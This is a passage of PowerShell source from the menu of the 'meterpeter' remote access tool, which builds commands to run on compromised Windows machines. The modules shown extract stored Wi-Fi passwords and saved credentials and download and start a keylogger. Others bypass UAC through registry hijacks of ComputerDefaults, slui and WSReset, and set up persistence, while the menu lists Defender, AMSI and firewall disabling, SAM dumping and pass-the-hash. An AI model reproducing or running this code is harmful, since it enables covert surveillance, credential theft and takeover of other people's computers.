      If($choise -ieq "ListRece" -or $choise -ieq "rece")
      {
        ## $path = "$env:userprofile\AppData\Roaming\Microsoft\Windows\Recent"
        write-host " List of Remote-Host Recent Contents." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
        $Command = "powershell dir `$env:userprofile\AppData\Roaming\Microsoft\Windows\Recent `> startup.txt;Get-content startup.txt;Remove-Item startup.txt -Force";
      }
      If($choise -ieq "StartUp" -or $choise -ieq "start")
      {
        write-host " List Remote-Host StartUp Contents." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
        $Command = "cmd /R dir /a `"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup`" `> startup.txt;Get-content startup.txt;Remove-Item startup.txt -Force";
      }
      If($choise -ieq "ListRun" -or $choise -ieq "run")
      {
        write-host " List Remote-Host StartUp Entrys (regedit)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
        $Command = "Get-Item -path `"HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce`" `> runen.txt;Get-Item -path `"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`" `>`> runen.txt;Get-Item -path `"HKLM:\Software\Microsoft\Windows\CurrentVersion\Run`" `>`> runen.txt;Get-ItemProperty -path `"HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`" -name Userinit|Select-Object PSChildName,PSDrive,Userinit `>`> runen.txt;Get-content runen.txt;Remove-Item runen.txt -Force";
      }
      If($choise -ieq "ListPriv" -or $choise -ieq "Priv")
      {
        write-host "`n   Remark" -ForegroundColor Yellow;
        write-host "   ------";
        write-host "   None of the modules in this sub-category will try to exploit any";
        write-host "   weak permissions found. They will only report the vulnerability.";
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     -------";
        write-host "   Check     Retrieve Folder Privileges      Client:User  - Privileges Required";
        write-host "   WeakDir   Search weak privs recursive     Client:User  - Privileges Required";
        write-host "   Service   Search Unquoted Service Paths   Client:User  - Privileges Required";
        write-host "   RottenP   Search For rotten potato vuln   Client:User  - Privileges Required";
        write-host "   RegACL    Insecure Registry Permissions   Client:User  - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Adv:Priv> " -NoNewline -ForeGroundColor Green;
        $my_choise = Read-Host;
        If($my_choise -ieq "Check" -or $my_choise -ieq "check")
        {
          write-host " List Remote-Host Folder Permissions (icacls)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;
          write-host " - Input Remote Folder Path (`$env:tmp): " -NoNewline;
          $RfPath = Read-Host;write-host "`n`n";
          If(-not($RfPath)){$RfPath = "$env:tmp"}
          $Command = "icacls `"$RfPath`" `> dellog.txt;Get-Content dellog.txt;remove-item dellog.txt -Force";
        }
        If($my_choise -ieq "WeakDir" -or $my_choise -ieq "Dir")
        {
          write-host " List Folder(s) Weak Permissions Recursive." -ForegroundColor Blue -BackgroundColor White;
          write-host " - Sellect User\Group (Everyone:|BUILTIN\Users:): " -NoNewline;
          $User_Attr = Read-Host;
          write-host " - Sellect Attribute to Search (F|M|C): " -NoNewline;
          $Attrib = Read-Host;
          write-host " - Input Remote Folder Path (`$env:tmp): " -NoNewline;
          $RfPath = Read-Host;Write-Host "`n`n";
          If(-not ($Attrib) -or $Attrib -eq " "){$Attrib = "F"};
          If(-not ($RfPath) -or $RfPath -eq " "){$RfPath = "$env:programfiles"};
          If(-not ($User_Attr) -or $User_Attr -eq " "){$User_Attr = "Everyone:"};
          $Command = "icacls `"$RfPath\*`" `> `$env:tmp\WeakDirs.txt;`$check_ACL = get-content `$env:tmp\WeakDirs.txt|findstr /I /C:`"$User_Attr`"|findstr /I /C:`"($Attrib)`";If(`$check_ACL){Get-Content `$env:tmp\WeakDirs.txt;remove-item `$env:tmp\WeakDirs.txt -Force}else{echo `"   [i] None Weak Folders Permissions Found [ $User_Attr($Attrib) ] ..`" `> `$env:tmp\Weak.txt;Get-Content `$env:tmp\Weak.txt;Remove-Item `$env:tmp\Weak.txt -Force;remove-item `$env:tmp\WeakDirs.txt -Force}";
       }
        If($my_choise -ieq "Service" -or $my_choise -ieq "service")
        {
          write-host " List Remote-Host Unquoted Service Paths." -ForegroundColor Blue -BackgroundColor White;
          write-host " https://medium.com/@orhan_yildirim/windows-privilege-escalation-unquoted-service-paths-61d19a9a1a6a" -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {`$_.StartMode -eq `"Auto`" -and `$_.PathName -notlike `"C:\Windows*`" -and `$_.PathName -notlike '`"*`"'} | select PathName,DisplayName,Name `> WeakFP.txt;Get-Content WeakFP.txt;remove-item WeakFP.txt -Force";
        }
        If($my_choise -ieq "RottenP" -or $my_choise -ieq "rotten")
        {
          write-host " Search for Rotten Potato Vulnerability." -ForegroundColor Blue -BackgroundColor White;
          write-host " https://areyou1or0.blogspot.com/2019/06/rotten-potato-privilege-escalation-by.html" -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   [i] Client:Admin Detected, this module cant run with admin Privileges`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{cmd /R whoami /priv|findstr /i /C:`"SeImpersonatePrivilege`" /C:`"SeAssignPrimaryPrivilege`" /C:`"SeTcbPrivilege`" /C:`"SeBackupPrivilege`" /C:`"SeRestorePrivilege`" /C:`"SeCreateTokenPrivilege`" /C:`"SeLoadDriverPrivilege`" /C:`"SeTakeOwnershipPrivilege`" /C:`"SeDebugPrivileges`" `> dellog.txt;`$check_ACL = get-content dellog.txt|findstr /i /C:`"Enabled`";If(`$check_ACL){echo `"[i] Rotten Potato Vulnerable Settings Found [Enabled] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Get-Content dellog.txt;remove-item dellog.txt -Force}else{echo `"   [i] None Weak Permissions Found [ Rotten Potato ] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Remove-Item dellog.txt -Force}}";
       }
        If($my_choise -ieq "RegACL" -or $my_choise -ieq "acl")
        {
          write-host " List Remote-Host Weak Services registry permissions." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;
          write-host " - Sellect User\Group (NT AUTHORITY\SYSTEM|BUILTIN\Users): " -NoNewline;
          $Group_Attr = Read-Host;write-host "`n";
          If(-not ($Group_Attr) -or $Group_Attr -eq " "){$Group_Attr = "BUILTIN\Users"};
          #$Command = "get-acl HKLM:\System\CurrentControlSet\services\*|Select-Object PSChildName,Owner,AccessToString,Path|format-list `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
          $Command = "Get-acl HKLM:\System\CurrentControlSet\services\*|Select-Object PSChildName,Owner,AccessToString,Path|Where-Object{`$_.Owner -contains `"$Group_Attr`"}|format-list|Out-File -FilePath `$env:tmp\acl.txt -Force;((Get-Content -Path `$env:tmp\acl.txt -Raw) -Replace `"CREATOR OWNER Allow  268435456`",`"`")|Set-Content -Path `$env:tmp\acl.txt -Force;Get-Content `$env:tmp\acl.txt|select-string PSChildName,Owner,FullControl,Path|Out-File -FilePath `$env:tmp\acl2.txt -Force;`$Chk = Get-Content `$env:tmp\acl2.txt|findstr `"FullControl`";If(-not (`$Chk)){echo `"   [i] None Vulnerable Service(s) Found that [ allow FullControl ] ..`" `> `$env:tmp\dellog.txt;Get-Content `$env:tmp\dellog.txt;Remove-Item `$env:tmp\dellog.txt -Force;Remove-Item `$env:tmp\acl.txt -Force;Remove-Item `$env:tmp\acl2.txt -Force}else{Get-Content `$env:tmp\acl2.txt;Remove-Item `$env:tmp\acl.txt -Force;Remove-Item `$env:tmp\acl2.txt -Force}";
        }
        If($my_choise -ieq "Return" -or $my_choise -ieq "return" -or $my_choise -ieq "cls" -or $my_choise -ieq "Modules" -or $my_choise -ieq "modules" -or $my_choise -ieq "clear")
        {
          $RfPath = $Null;
          $Command = $Null;
          $my_choise = $Null;
          $Group_Attr = $Null;
        }
      }
      If($choise -ieq "ListCred" -or $choise -ieq "cred")
      {
        write-host " List of Remote-Host cmdkey store Credentials." -ForegroundColor Blue -BackgroundColor White;
        write-host " [example]: runas /savecred /user:WORKGROUP\Administrator `"\\$Local_Host\SHARE\evil.exe`"" -ForegroundColor Yellow;Start-Sleep -Seconds 2;write-host "`n";
        $Command = "cmd /R cmdkey /list `> dellog.txt;`$check_keys = Get-Content dellog.txt|Select-string `"User:`";If(-not (`$check_keys)){echo `"   [i] None Stored Credentials Found ...`" `> test.txt;Get-Content text.txt;Remove-Item text.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
      }
      If($choise -ieq "ListDNS" -or $choise -ieq "dns")
      {
        write-host " List of Remote-Host DNS Entrys." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
        # $Command = "cmd /R ipconfig /displaydns > dns.txt;Get-Content dns.txt;remove-item dns.txt -Force";
        $Command = "cmd /R ipconfig /displaydns | findstr /C:`"Record Name`" /C:`"A (Host) Record`" > dns.txt;Get-Content dns.txt;remove-item dns.txt -Force";
      }
      If($choise -ieq "ListConn" -or $choise -ieq "conn")
      {
        write-host " List of Remote-Host Active TCP Connections." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
        Write-Host "  Proto  Local                  Remote                 Status          PID" -ForeGroundColor green;
        Write-Host "  -----  -----                  ------                 ------          ---";
        $Command = "cmd /R netstat -ano|findstr `"ESTABLISHED`" `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] None 'ESTABLISHED' Connection Found ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
      }
      If($choise -ieq "ListIpv4" -or $choise -ieq "ipv4")
      {
        write-host " List of Remote-Host IPv4 Network Statistics." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
        $Command = "cmd /R netstat -s -p ip `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve IPv4 statistics ...`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
      }      
      If($choise -ieq "ListWifi" -or $choise -ieq "wifi")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     -------";
        write-host "   ListProf  Remote-Host wifi Profile        Client:User  - Privileges Required";
        write-host "   ListNetw  List wifi Available networks    Client:User  - Privileges Required";
        write-host "   ListSSID  List Remote-Host SSID Entrys    Client:User  - Privileges Required";
        write-host "   SSIDPass  Extract Stored SSID passwords   Client:User  - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Adv:Wifi> " -NoNewline -ForeGroundColor Green;
        $wifi_choise = Read-Host;
        If($wifi_choise -ieq "ListProf" -or $wifi_choise -ieq "prof")
        {
          write-host " Remote-Host Profile Statistics." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "cmd /R Netsh WLAN show interface `> pro.txt;`$check_tasks = Get-content pro.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve wifi profile ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item pro.txt -Force}else{Get-Content pro.txt;Remove-Item pro.txt -Force}";          
        }
        If($wifi_choise -ieq "ListNetw" -or $wifi_choise -ieq "netw")
        {
          write-host " List Available wifi Networks." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "cmd /R Netsh wlan show networks `> pro.txt;`$check_tasks = Get-content pro.txt;If(-not (`$check_tasks)){echo `"   [i] None networks list found in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item pro.txt -Force}else{Get-Content pro.txt;Remove-Item pro.txt -Force}";          
        }
        If($wifi_choise -ieq "ListSSID" -or $wifi_choise -ieq "ssid")
        {
          write-host " List of Remote-Host SSID profiles." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "cmd /R Netsh WLAN show profiles `> ssid.txt;`$check_tasks = Get-content ssid.txt;If(-not (`$check_tasks)){echo `"   [i] None SSID profile found in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item ssid.txt -Force}else{Get-Content ssid.txt;Remove-Item ssid.txt -Force}";
        }
        If($wifi_choise -ieq "SSIDPass" -or $wifi_choise -ieq "pass")
        {
          write-host " - Sellect WIFI Profile: " -NoNewline;
          $profile = Read-Host;
          If(-not ($profile) -or $profile -eq " ")
          {
            write-host " [ERROR] None Profile Name provided .." -ForegroundColor red -BackGroundColor white;
            write-host " [Usage] meterpeter> AdvInfo -> WifiPass -> ListSSID (to List Profiles)." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
            Start-Sleep -Seconds 4;
            $Command = $Null;
            $profile = $Null;
          }else{
            write-host " Extracting SSID Password." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
            $Command = "cmd /R netsh wlan show profile $profile Key=Clear `> key.txt;Get-Content key.txt;Remove-Item key.txt -Force"
          }
          $profile = $Null;
        }
        If($wifi_choise -ieq "Return" -or $wifi_choise -ieq "return" -or $wifi_choise -ieq "cls" -or $wifi_choise -ieq "Modules" -or $wifi_choise -ieq "modules" -or $wifi_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
        }
        $choise = $Null;
        $wifi_choise = $Null;
      }  
      If($choise -ieq "Return" -or $choise -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "Modules" -or $choise -ieq "modules")
      {
        $Command = $Null;
      }
      $wifi_choise = $Null;
      $choise = $Null;
      $Clear = $True;
    }

    ## venom v1.0.16 function
    If($Command -ieq "Session")
    {
      ## Check if client (target machine) is still connected ..
      $ParseID = "$Local_Host"+":"+"$Local_Port";-Join ''
      $SessionID = netstat -ano|Select-String "$ParseID"|Select-Object -First 1
      $Command = $SessionID
      Write-Host "`n    Proto  Attacker               Target                 Status          PID" -ForeGroundColor green;
      Write-Host "    -----  --------               ------                 ------          ---";
      ## Display connections statistics
      If(-not($Command) -or $Command -eq " ")
      {
        Write-Host "    None Connections found                              (Client Disconnected)" -ForeGroundColor Red
      } Else {
        Write-Host "  $Command"
      }
      $Command = $Null;
    }



    ## venom v1.0.16 function
    # This module uses redpill keylogger.ps1 cmdlet
    If($Command -ieq "keylogger"){

        write-host "`n`n   Modules   Description                  Remark" -ForegroundColor green;
        write-host "   -------   -----------                  ------";
        write-host "   Start     Start remote keylogger       Start Record remote keystrokes";
        write-host "   Stop      Stop keylogger Process(s)    Stop record and leak keystrokes";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:keylogger> " -NoNewline -ForeGroundColor Green;
        $choise = Read-Host;

        If($choise -ieq "Start"){## Start recording system keystrokes
            If(-not(Test-Path -Path "$Env:TMP\Keylogger.ps1")){## Make sure keylogger.ps1 exists remote
                $Command = "Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Keylogger.ps1 -Destination $Env:TMP\Keylogger.ps1 -ErrorAction SilentlyContinue|Out-Null;powershell -File `"$Env:TMP\Keylogger.ps1`" -Keylogger Start"
            }Else{
                $Command = "powershell -File `"$Env:TMP\Keylogger.ps1`" -Keylogger Start"
            }
        }

        If($choise -ieq "Stop"){## Stop recording system keystrokes
            If(-not(Test-Path -Path "$Env:TMP\Keylogger.ps1")){## Make sure keylogger.ps1 exists remote
                $Command = "Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Keylogger.ps1 -Destination $Env:TMP\Keylogger.ps1 -ErrorAction SilentlyContinue|Out-Null;powershell -File `"$Env:TMP\Keylogger.ps1`" -Keylogger Stop;Start-sleep -Seconds 2;Remove-Item -Path `"$Env:TMP\Keylogger.ps1`" -Force"
            }Else{
                $Command = "powershell -File `"$Env:TMP\Keylogger.ps1`" -Keylogger Stop;Start-sleep -Seconds 2;Remove-Item -Path `"$Env:TMP\Keylogger.ps1`" -Force"
            }        
        }

       If($choise -ieq "Return" -or $choice -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "Modules" -or $choise -ieq "modules" -or $choise -ieq "clear"){
           $Command = $Null; 
       }

    }


    ## Venom v1.0.16 function
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ## Post-Exploiation Modules (red-team)
      write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
      write-host "   -------   -----------                     ------";
      write-host "   Escalate  Escalate Privileges             Client UserLand to NT/SYSTEM";
      write-host "   Persist   Remote Persist Client           Execute Client on every startup";
      write-host "   CamSnap   Remote WebCam Screenshot        Take a screenshot using webcam";
      write-host "   Restart   Restart in xx seconds           Restart Remote-Host with MsgBox";
      write-host "   ListLog   List/Delete EventLogs           Remote List/Delete eventvwr Logs";
      write-host "   SetMace   Change files date/time          Change Remote-Host Files TimeStomp";
      write-host "   ListPas   Search remote passwords         Search stored passwords in txt|logs";
      write-host "   ListDir   Search for hidden folders       Search for hidden folders recursive";
      write-host "   GoogleX   Open Google Sphere(prank)       Open Remote Browser in google sphere";
      write-host "   LockPC    Lock Remote WorkStation         Lock Remote workstation (rundll32)";
      write-host "   SpeakPC   Make Remote-Host Speak          Input Frase for Remote-Host to Speak";
      write-host "   Browser   Enumerate Browsers Info         Client:User  - Privileges Required";
      write-host "   CredPhi   Promp for logon creds           Client:User|Admin - Privs Required";
      write-host "   AMSIset   Turn On/Off AMSI (reg)          Client:User|Admin - Privs Required";
      write-host "   UACSet    Turn On/Off remote UAC          Client:Admin - Privileges Required";
      write-host "   ASLRSet   Turn On/Off remote ASLR         Client:Admin - Privileges Required";
      write-host "   TaskMan   Turn On/off TaskManager         Client:Admin - Privileges Required";
      write-host "   Firewall  Turn On/Off Remote  Firewall    Client:Admin - Privileges Required";
      write-host "   Defender  Turn On/off Windows Defender    Client:Admin - Privileges Required";
      write-host "   Dnspoof   Hijack Entrys in hosts file     Client:Admin - Privileges Required";
      write-host "   NoDrive   Hide Drives from Explorer       Client:Admin - Privileges Required";
      write-host "   DumpSAM   Dump SAM/SYSTEM Credentials     Client:Admin - Privileges Required";
      write-host "   PtHash    Pass-The-Hash (remote auth)     Server:Admin - Privileges Required";
      write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
      write-host "`n`n :meterpeter:Post> " -NoNewline -ForeGroundColor Green;
      $choise = Read-Host;
      If($choise -ieq "Escalate" -or $choice -ieq "escalate")
      {
        write-host "`n   Getsystem Requirements" -ForegroundColor Yellow;
        write-host "   ----------------------";
        write-host "   Attacker needs to input the delay time (in seconds) for the Client";
        write-host "   to beacon home after privilege escalation. Attacker also needs to exit";
        write-host "   and put meterpeter in listenner mode to be abble to catch the connection.";
        write-host "`n`n   Modules     Description                  Remark" -ForegroundColor green;
        write-host "   -------     -----------                  ------";
        write-host "   CompEOP     Execute 1 command as admin   Client:User  - Privileges required";
        write-host "   SluiEOP     Execute 1 command as admin   Client:User  - Privileges required";
        write-host "   getsystem   Escalate Client Privileges   Client:User  - Privileges required";
        write-host "   Delete      Delete getsystem settings    Client:User  - Privileges required";
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Escalate> " -NoNewline -ForeGroundColor Green;
        $Escal_choise = Read-Host;
        If($Escal_choise -ieq "CompEOP" -or $Escal_choise -ieq "compeop")
        {
           $name = "CompDefault.ps1";
           $File = "$Bin$name"
           If(([System.IO.File]::Exists("$File")))
           {
              write-host "`n   EOP Module Remark" -ForegroundColor Yellow;
              write-host "   -----------------";
              write-host "   This module uploads CompDefault.ps1 script to `$env:TMP dir and executes";
              write-host "   EOP|UAC bypass to silent execute our command with higth privileges. (Admin)`n`n";

              write-host " - Input Command: " -NoNewline;
              $mYcOMMAND = Read-Host
              ## Make the command persistence
              write-host " - MakeItPersistence (True/False): " -NoNewline;
              $PersisteMe = Read-Host
              If(-not($PersisteMe) -or $PersisteMe -ieq $null){$PersisteMe = "False"}
              If($PersisteMe -ieq "True"){
                 cd mimiRatz
                 $CheckValue = Get-Content CompDefault.ps1|Select-String "MakeItPersistence ="
                 If($CheckValue -match 'False'){
                    ((Get-Content -Path CompDefault.ps1 -Raw) -Replace "MakeItPersistence = `"False`"","MakeItPersistence = `"True`"")|Set-Content -Path CompDefault.ps1 -Force
                 }
                 cd ..
              }
              If($PersisteMe -ieq "True"){
                 write-host "`n   If 'MakeItPersistence' its activated (True) then CompDefault will NOT";
                 write-host "   Delete the EOP, making the 'command' available everytime we execute";
                 write-host "   powershell Start-Process `"C:\Windows\System32\ComputerDefaults.exe`""
                 write-host "   Remark: .\CompDefault.ps1 `"deleteEOP`" argument deletes the persistence" -ForeGroundColor yellow;
              }

              If(-not($mYcOMMAND) -or $mYcOMMAND -ieq $null){$mYcOMMAND = "$env:WINDIR\System32\cmd.exe"}
              ## Write Local script (CompDefault.ps1) to Remote-Host $env:tmp
              $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
              $FileBytes = "($FileBytes)";
              $File = $File.Split('\')[-1];
              $File = $File.Split('/')[-1];
              $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};powershell.exe -exec bypass -w 1 -File `"`$env:TMP\CompDefault.ps1`" `"$mYcOMMAND`""
              $Command = $Command -replace "#","$File";
              $Command = $Command -replace "@","$FileBytes";
              $Upload = $True;
              $COMEOP = "True"
           }else{
              ## Local File { CompDefault.ps1 } not found .
              Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
              Write-Host "   ------     ----------";
              Write-Host "   Not Found  $File" -ForeGroundColor red;
              $File = $Null;
              $Command = $Null;
              $Upload = $False; 
           }
        }
        If($Escal_choise -ieq "SluiEOP" -or $Escal_choise -ieq "slui")
        {
           $name = "SluiEOP.ps1";
           $File = "$Bin$name"
           If(([System.IO.File]::Exists("$File")))
           {
              write-host "`n   EOP Module Remark" -ForegroundColor Yellow;
              write-host "   -----------------";
              write-host "   This module uploads SluiEOP.ps1 script to `$env:TMP dir and executes";
              write-host "   EOP|UAC bypass to silent execute our command with higth privileges. (Admin)`n`n";

              write-host " - Input Command: " -NoNewline;
              $mYcOMMAND = Read-Host
              ## Make the command persistence
              write-host " - MakeItPersistence (True/False): " -NoNewline;
              $PersisteMe = Read-Host
              If(-not($PersisteMe) -or $PersisteMe -ieq $null){$PersisteMe = "False"}
              If($PersisteMe -ieq "True"){
                 cd mimiRatz
                 $CheckValue = Get-Content SluiEOP.ps1|Select-String "MakeItPersistence ="
                 If($CheckValue -match 'False'){
                    ((Get-Content -Path SluiEOP.ps1 -Raw) -Replace "MakeItPersistence = `"False`"","MakeItPersistence = `"True`"")|Set-Content -Path SluiEOP.ps1 -Force
                 }
                 cd ..
              }

              If($PersisteMe -ieq "True"){
                 write-host "`n   If 'MakeItPersistence' its activated (True) then SluiEOP will NOT";
                 write-host "   Delete the EOP, making the 'command' available everytime we execute";
                 write-host "   powershell Start-Process `"C:\Windows\System32\slui.exe`" -verb runas"
                 write-host "   Remark: .\SluiEOP.ps1 `"deleteEOP`" argument deletes the persistence" -ForeGroundColor yellow;
              }

              If(-not($mYcOMMAND) -or $mYcOMMAND -ieq $null){$mYcOMMAND = "$env:WINDIR\System32\cmd.exe"}
              ## Write Local script (SluiEOP.ps1.ps1) to Remote-Host $env:tmp
              $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
              $FileBytes = "($FileBytes)";
              $File = $File.Split('\')[-1];
              $File = $File.Split('/')[-1];
              $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};powershell.exe -exec bypass -w 1 -File `"`$env:TMP\SluiEOP.ps1`" `"$mYcOMMAND`""
              $Command = $Command -replace "#","$File";
              $Command = $Command -replace "@","$FileBytes";
              $Upload = $True;
              $SluiEOP = "True"
           }else{
              ## Local File { SluiEOP.ps1 } not found .
              Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
              Write-Host "   ------     ----------";
              Write-Host "   Not Found  $File" -ForeGroundColor red;
              $File = $Null;
              $Command = $Null;
              $Upload = $False; 
           }
        }
        If($Escal_choise -ieq "GetSystem" -or $Escal_choise -ieq "getsystem")
        {
          write-host " - Input Delay Time (eg: 60): " -NoNewline;
          $Input_Delay = Read-Host;
          If(-not($Input_Delay) -or $Input_Delay -lt "30"){$Input_Delay = "60"}
          $Delay_Time = "$Input_Delay"+"000";
          write-host " Elevate Client ($payload_name.ps1) Privileges." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          Write-Host "   Status   Remote Path           Execution" -ForeGroundColor green;
          Write-Host "   ------   -----------           ---------";
          Write-Host "   Created  `$env:tmp\WStore.vbs   $Input_Delay (sec)`n`n"; 
          Write-Host "   [i] Exit|Start meterpeter.ps1 again (use same ip|port|obfuscation)" -ForeGroundColor yellow;
          Write-Host "   [i] to recive the elevated Connection back in $Input_Delay seconds." -ForeGroundColor yellow;Start-Sleep -Seconds 5;
          $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\WStore.vbs;echo 'WScript.sleep $Delay_Time' `>`> `$env:tmp\WStore.vbs;echo 'objShell.Run `"cmd /R powershell Start-Process -FilePath C:\Windows\System32\WSReset.exe -WindowStyle Hidden`", 0, True' `>`> `$env:tmp\WStore.vbs;`$cmdline = `"cmd /R start powershell -exec bypass -w 1 -File `$env:tmp\Update-KB4524147.ps1`";`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";New-Item `$CommandPath -Force|Out-Null;New-ItemProperty -Path `$CommandPath -Name `"DelegateExecute`" -Value `"`" -Force|Out-Null;Set-ItemProperty -Path `$CommandPath -Name `"(default)`" -Value `$cmdline -Force -ErrorAction SilentlyContinue|Out-Null;cmd.exe /R start %tmp%\WStore.vbs";
        }
        If($Escal_choise -ieq "Delete" -or $Escal_choise -ieq "del")
        {
          write-host " Delete Privilege Escalation Old Files|Configurations." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";If(Test-Path `$CommandPath){Remove-Item `$CommandPath -Recurse -Force;echo `"   [i] Privilege Escalation Registry hive Deleted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\WStore.vbs}else{echo `"   [i] Privilege Escalation Vulnerable Registry hive: [NOT FOUND] ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\WStore.vbs}";
        }
        If($Escal_choise -ieq "Return" -or $Escal_choise -ieq "return" -or $Escal_choise -ieq "cls" -or $Escal_choise -ieq "Modules" -or $Escal_choise -ieq "modules" -or $Escal_choise -ieq "clear")
        {
          $File = $Null;
          $choise = $Null;
          $Command = $Null;
          $trigger = $Null;
          $Escal_choise = $Null;
          $trigger_File = $Null;
          $Input_Delay = $Null;
        }
      }
      If($choise -ieq "Persist" -or $choise -ieq "persistance")
      {
        write-host "`n   Requirements" -ForegroundColor Yellow;
        write-host "   ------------";
        write-host "   Client must be deploy in target %TEMP% folder.";
        write-host "   Server must be put in listener mode using same configs.";
        write-host "   Target machine needs to restart (startup) to beacon home.";
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Beacon    Persiste Client using startup   Client:User  - Privileges required";
        write-host "   RUNONCE   Persiste Client using REG:Run   Client:User  - Privileges required";
        write-host "   REGRUN    Persiste Client using REG:Run   Client:User|Admin - Privs required";
        write-host "   Schtasks  Persiste Client using Schtasks  Client:Admin - Privileges required";
        write-host "   WinLogon  Persiste Client using WinLogon  Client:Admin - Privileges required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Persistance> " -NoNewline -ForeGroundColor Green;
        $startup_choise = Read-Host;
        If($startup_choise -ieq "Beacon" -or $startup_choise -ieq "Beacon")
        {
          $dat = Get-Date;
          $BeaconTime = $Null;
          $logfile = "$IPATH"+"beacon.log";
          Write-host " - Input Time (sec) to beacon home (eg: 60): " -NoNewline;
          $Delay_Time = Read-Host;
          If(-not($Delay_Time) -or $Delay_Time -lt "30"){$Delay_Time = "60"}
          $BeaconTime = "$Delay_Time"+"000";
          write-host " Execute Client ($payload_name.ps1) at $Delay_Time (sec) loop." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          Write-Host "   Scripts               Remote Path" -ForeGroundColor green;
          Write-Host "   -------               -----------";
          Write-Host "   $payload_name.ps1  `$env:tmp\$payload_name.ps1";
